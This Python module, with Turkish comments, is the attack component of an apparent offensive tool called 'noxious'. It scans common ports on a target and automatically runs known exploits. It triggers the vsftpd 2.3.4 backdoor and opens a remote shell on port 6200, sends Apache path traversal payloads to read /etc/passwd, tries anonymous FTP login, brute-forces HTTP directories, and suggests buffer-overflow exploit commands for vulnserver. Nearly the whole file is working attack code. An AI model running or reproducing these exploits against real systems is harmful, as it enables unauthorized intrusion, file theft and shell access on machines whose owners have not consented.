#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
noxious ağ saldırı modülü - keşfedilen servislere bilinen exploit'leri çalıştırır

desteklenen exploit'ler:
    - vsftpd 2.3.4 backdoor (CVE-2011-2523)
    - apache path traversal (CVE-2021-41773 / CVE-2021-42013)
    - ftp anonim giriş testi
    - http dizin keşfi
    - vulnserver buffer overflow (istismarci.py entegrasyonu)
"""

import socket
import ftplib
import http.client
import time
from typing import Optional, List, Dict

from cekirdek.gunluk import Gunluk
from cekirdek.ag_yardimcilar import ip_gecerli_mi
from saldiri_verileri import (
    PATH_TRAVERSAL_PAYLOADLARI,
    YAYGIN_DIZINLER,
    HTTP_USER_AGENTS,
)
from zafiyet_veritabani import port_servis_adi


def saldiri_baslat(
    hedef_ip: str,
    port: Optional[int] = None,
    servis_bilgi: Optional[Dict] = None,
    zaman_asimi: float = 5.0,
    gunluk: Optional[Gunluk] = None,
) -> List[Dict]:
    """
    hedefe uygun exploit'leri otomatik çalıştırır

    parametreler:
        hedef_ip: hedef ip adresi
        port: hedef port (none ise yaygın portlar denenir)
        servis_bilgi: servis tespiti sonucu (servis adı, versiyon vb.)
        zaman_asimi: bağlantı zaman aşımı
        gunluk: loglama nesnesi

    döndürür:
        saldırı sonuçları listesi
    """
    if gunluk is None:
        gunluk = Gunluk()

    if not ip_gecerli_mi(hedef_ip):
        gunluk.hata(f"geçersiz hedef ip: {hedef_ip}")
        return []

    gunluk.baslik(f"saldırı — {hedef_ip}")
    gunluk.bilgi(f"hedef : {hedef_ip}")
    gunluk.bos_satir()

    sonuclar = []

    if port:
        # belirli bir porta saldır
        gunluk.bilgi(f"hedef port kontrol ediliyor: {port}/tcp ({port_servis_adi(port)})")
        if _port_acik_mi(hedef_ip, port, zaman_asimi):
            sonuclar.extend(_porta_saldiri(hedef_ip, port, servis_bilgi, zaman_asimi, gunluk))
        else:
            gunluk.uyari(f"port {port}/tcp kapalı veya erişilemiyor")
    else:
        # yaygın portları tara ve saldır
        yaygin_portlar = [21, 22, 80, 443, 8080, 9999]
        gunluk.bilgi(f"yaygın servis portları taranıyor ({', '.join(str(p) for p in yaygin_portlar)})...")
        acik_port_sayisi = 0
        for p in yaygin_portlar:
            if _port_acik_mi(hedef_ip, p, zaman_asimi):
                acik_port_sayisi += 1
                gunluk.basari(f"açık port bulundu: {p}/tcp ({port_servis_adi(p)})")
                sonuclar.extend(_porta_saldiri(hedef_ip, p, None, zaman_asimi, gunluk))
        if acik_port_sayisi == 0:
            gunluk.uyari("hedefte test edilecek bilinen açık servis portu bulunamadı")

    # özet
    gunluk.bos_satir()
    gunluk.ayirici("=")
    basarili = [s for s in sonuclar if s.get("basarili")]
    gunluk.basari(f"toplam saldırı: {len(sonuclar)}, başarılı: {len(basarili)}")

    if basarili:
        gunluk.bos_satir()
        for s in basarili:
            gunluk.basari(f"  [{s['exploit']}] {s.get('detay', '')}")

    return sonuclar


def _porta_saldiri(hedef_ip, port, servis_bilgi, zaman_asimi, gunluk):
    """belirli bir porta uygun saldırıları çalıştırır"""
    sonuclar = []
    servis = port_servis_adi(port)

    if port == 21 or servis == "ftp":
        # ftp anonim giriş
        sonuclar.append(_ftp_anonim_giris(hedef_ip, port, zaman_asimi, gunluk))
        # vsftpd backdoor kontrolü
        if servis_bilgi and "vsftpd" in str(servis_bilgi.get("servis", "")).lower():
            sonuclar.append(_vsftpd_backdoor(hedef_ip, zaman_asimi, gunluk))
        else:
            # her durumda dene
            sonuclar.append(_vsftpd_backdoor(hedef_ip, zaman_asimi, gunluk))

    if port in (80, 8080, 443, 8443) or servis in ("http", "http-proxy", "https"):
        # path traversal
        sonuclar.append(_apache_path_traversal(hedef_ip, port, zaman_asimi, gunluk))
        # dizin keşfi
        sonuclar.append(_http_dizin_tarama(hedef_ip, port, zaman_asimi, gunluk))

    if port == 9999 or servis == "vulnserver":
        sonuclar.append(_vulnserver_tespiti(hedef_ip, port, zaman_asimi, gunluk))

    return sonuclar


# ========================================
# exploit fonksi̇yonlari
# ========================================

def _vsftpd_backdoor(hedef_ip: str, zaman_asimi: float, gunluk: Gunluk) -> Dict:
    """
    vsftpd 2.3.4 backdoor exploit (CVE-2011-2523)

    vsftpd 2.3.4'ün kaynak koduna eklenen arka kapı:
    kullanıcı adı ":)" ile biterse port 6200'de shell açılır
    """
    sonuc = {
        "exploit": "vsftpd-2.3.4-backdoor",
        "hedef": f"{hedef_ip}:21",
        "basarili": False,
        "detay": "",
    }

    gunluk.bilgi("[vsftpd backdoor] CVE-2011-2523 deneniyor...")

    try:
        # backdoor'u tetikle — ":)" ile biten kullanıcı adı gönder
        soket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        soket.settimeout(zaman_asimi)
        soket.connect((hedef_ip, 21))

        # banner oku
        banner = soket.recv(1024).decode("utf-8", errors="replace")
        gunluk.ayiklama(f"ftp banner: {banner.strip()}")

        # backdoor tetikleme
        soket.sendall(b"USER noxious:)\r\n")
        soket.recv(1024)
        soket.sendall(b"PASS noxious\r\n")
        try:
            soket.recv(1024)
        except socket.timeout:
            pass
        soket.close()

        # port 6200'e bağlanmayı dene
        time.sleep(1.0)
        shell_soket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        shell_soket.settimeout(zaman_asimi)
        try:
            shell_soket.connect((hedef_ip, 6200))
            # komut gönder
            shell_soket.sendall(b"id\n")
            time.sleep(0.5)
            yanit = shell_soket.recv(4096).decode("utf-8", errors="replace")
            shell_soket.close()

            if "uid=" in yanit:
                sonuc["basarili"] = True
                sonuc["detay"] = f"backdoor shell açık! port 6200 — {yanit.strip()}"
                gunluk.basari(f"[vsftpd backdoor] BAŞARILI! shell: {yanit.strip()}")
                gunluk.basari(f"  bağlanmak için: nc {hedef_ip} 6200")
            else:
                sonuc["detay"] = f"port 6200 açık ama shell yanıtı alınamadı"
                gunluk.uyari(f"[vsftpd backdoor] port 6200 açık ama yanıt belirsiz")

        except (ConnectionRefusedError, socket.timeout):
            sonuc["detay"] = "backdoor tetiklenemedi (port 6200 kapalı)"
            gunluk.bilgi("[vsftpd backdoor] zafiyet bulunamadı (port 6200 kapalı)")

    except (socket.timeout, ConnectionRefusedError, OSError) as hata:
        sonuc["detay"] = f"bağlantı hatası: {hata}"
        gunluk.ayiklama(f"[vsftpd backdoor] hata: {hata}")

    return sonuc


def _ftp_anonim_giris(hedef_ip: str, port: int, zaman_asimi: float, gunluk: Gunluk) -> Dict:
    """ftp anonim giriş testi"""
    sonuc = {
        "exploit": "ftp-anonymous",
        "hedef": f"{hedef_ip}:{port}",
        "basarili": False,
        "detay": "",
    }

    gunluk.bilgi("[ftp anonim] anonim giriş deneniyor...")

    try:
        ftp = ftplib.FTP()
        ftp.connect(hedef_ip, port, timeout=zaman_asimi)
        ftp.login("anonymous", "noxious@test.com")

        # dizin listesi al
        dosyalar = []
        try:
            dosyalar = ftp.nlst()
        except ftplib.error_perm:
            pass

        ftp.quit()

        sonuc["basarili"] = True
        sonuc["detay"] = f"anonim giriş başarılı! {len(dosyalar)} dosya/dizin bulundu"
        gunluk.basari(f"[ftp anonim] BAŞARILI! anonim erişim açık")
        if dosyalar:
            for d in dosyalar[:10]:  # ilk 10 dosya
                gunluk.bilgi(f"  {d}")
            if len(dosyalar) > 10:
                gunluk.bilgi(f"  ... ve {len(dosyalar) - 10} dosya daha")

    except ftplib.error_perm:
        sonuc["detay"] = "anonim giriş reddedildi"
        gunluk.bilgi("[ftp anonim] anonim giriş reddedildi")
    except (socket.timeout, ConnectionRefusedError, OSError, EOFError) as hata:
        sonuc["detay"] = f"bağlantı hatası: {hata}"
        gunluk.ayiklama(f"[ftp anonim] hata: {hata}")

    return sonuc


def _apache_path_traversal(hedef_ip: str, port: int, zaman_asimi: float, gunluk: Gunluk) -> Dict:
    """apache path traversal exploit (cve-2021-41773 / cve-2021-42013)"""
    sonuc = {
        "exploit": "apache-path-traversal",
        "hedef": f"{hedef_ip}:{port}",
        "basarili": False,
        "detay": "",
    }

    gunluk.bilgi("[path traversal] CVE-2021-41773/42013 deneniyor...")

    for payload in PATH_TRAVERSAL_PAYLOADLARI:
        try:
            baglanti = http.client.HTTPConnection(hedef_ip, port, timeout=zaman_asimi)
            baglanti.request("GET", payload, headers={
                "User-Agent": HTTP_USER_AGENTS[0],
                "Host": hedef_ip,
            })
            yanit = baglanti.getresponse()
            icerik = yanit.read(4096).decode("utf-8", errors="replace")
            baglanti.close()

            # /etc/passwd okuma başarılı mı?
            if yanit.status == 200 and ("root:" in icerik or "[extensions]" in icerik):
                sonuc["basarili"] = True
                sonuc["detay"] = f"path traversal başarılı! payload: {payload}"
                gunluk.basari(f"[path traversal] BAŞARILI!")
                gunluk.basari(f"  payload: {payload}")
                gunluk.bilgi(f"  yanıt (ilk 200 byte):")
                for satir in icerik[:200].split("\n")[:5]:
                    gunluk.bilgi(f"    {satir}")
                return sonuc

        except (socket.timeout, ConnectionRefusedError, OSError, http.client.HTTPException):
            continue

    sonuc["detay"] = f"{len(PATH_TRAVERSAL_PAYLOADLARI)} payload denendi, zafiyet bulunamadı"
    gunluk.bilgi("[path traversal] zafiyet bulunamadı")
    return sonuc


def _http_dizin_tarama(hedef_ip: str, port: int, zaman_asimi: float, gunluk: Gunluk) -> Dict:
    """http dizin/dosya keşfi"""
    sonuc = {
        "exploit": "http-directory-scan",
        "hedef": f"{hedef_ip}:{port}",
        "basarili": False,
        "detay": "",
        "bulunanlar": [],
    }

    gunluk.bilgi(f"[dizin tarama] {len(YAYGIN_DIZINLER)} dizin/dosya deneniyor...")

    bulunanlar = []

    for dizin in YAYGIN_DIZINLER:
        try:
            baglanti = http.client.HTTPConnection(hedef_ip, port, timeout=zaman_asimi)
            baglanti.request("GET", dizin, headers={
                "User-Agent": HTTP_USER_AGENTS[0],
                "Host": hedef_ip,
            })
            yanit = baglanti.getresponse()
            yanit.read()  # body tüket
            baglanti.close()

            # 200, 301, 302, 403 (var ama erişim engelli) bulundu sayılır
            if yanit.status in (200, 301, 302):
                bulunanlar.append({"yol": dizin, "durum": yanit.status})
                gunluk.basari(f"  [{yanit.status}] {dizin}")
            elif yanit.status == 403:
                bulunanlar.append({"yol": dizin, "durum": 403})
                gunluk.uyari(f"  [403] {dizin} (erişim engelli)")

        except (socket.timeout, ConnectionRefusedError, OSError, http.client.HTTPException):
            continue

    if bulunanlar:
        sonuc["basarili"] = True
        sonuc["bulunanlar"] = bulunanlar
        sonuc["detay"] = f"{len(bulunanlar)} dizin/dosya bulundu"
    else:
        sonuc["detay"] = "dizin/dosya bulunamadı"
        gunluk.bilgi("[dizin tarama] kayda değer bulgu yok")

    return sonuc


def _vulnserver_tespiti(hedef_ip: str, port: int, zaman_asimi: float, gunluk: Gunluk) -> Dict:
    """vulnserver tespiti ve exploit önerisi"""
    sonuc = {
        "exploit": "vulnserver-detect",
        "hedef": f"{hedef_ip}:{port}",
        "basarili": False,
        "detay": "",
    }

    gunluk.bilgi("[vulnserver] banner kontrolü yapılıyor...")

    try:
        soket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        soket.settimeout(zaman_asimi)
        soket.connect((hedef_ip, port))
        banner = soket.recv(1024).decode("utf-8", errors="replace")
        soket.close()

        if "vulnerable" in banner.lower() or "vulnserver" in banner.lower():
            sonuc["basarili"] = True
            sonuc["detay"] = f"vulnserver tespit edildi — buffer overflow exploit önerilir"
            gunluk.basari(f"[vulnserver] TESPIT EDİLDİ!")
            gunluk.basari(f"  banner: {banner.strip()}")
            gunluk.bos_satir()
            gunluk.bilgi("  exploit için:")
            gunluk.bilgi(f"    python3 noxious.py fuzzing --hedef {hedef_ip} --port {port}")
            gunluk.bilgi(f"    python3 noxious.py offset --hedef {hedef_ip} --port {port} --uzunluk 3000")
            gunluk.bilgi(f"    python3 noxious.py exploit --hedef {hedef_ip} --port {port} --jmp-adresi 625011af")
        else:
            sonuc["detay"] = f"port {port} açık ama vulnserver değil"
            gunluk.bilgi(f"[vulnserver] banner: {banner.strip()[:60]}")

    except (socket.timeout, ConnectionRefusedError, OSError) as hata:
        sonuc["detay"] = f"bağlantı hatası: {hata}"

    return sonuc


# ========================================
# yardimci
# ========================================

def _port_acik_mi(hedef_ip: str, port: int, zaman_asimi: float) -> bool:
    """port açık mı kontrol eder"""
    try:
        soket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        soket.settimeout(zaman_asimi)
        sonuc = soket.connect_ex((hedef_ip, port))
        soket.close()
        return sonuc == 0
    except (socket.timeout, OSError):
        return False
